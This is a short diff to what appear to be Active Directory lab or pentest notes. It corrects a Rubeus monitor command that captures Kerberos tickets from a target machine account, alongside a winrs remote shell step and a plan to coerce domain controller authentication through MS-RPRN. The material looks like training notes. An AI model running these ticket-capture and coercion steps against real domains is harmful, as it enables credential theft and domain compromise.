@@ -9,7 +9,7 @@ winrs -r:<LISTENER MACHINE> cmd
 ```
 Launch rubeus
 ```powershell
-C:\Users\Public\Rubeus.exe monitor /targetuser:<TARGET MACHINE /interval:5 /nowrap
+C:\Users\Public\Rubeus.exe monitor /targetuser:<TARGET MACHINE>$ /interval:5 /nowrap
 ```
 ![[Pasted image 20231025163953.png]]
 Now use MS-RPRN to force authentication from dcorp-dc$(Machine account)
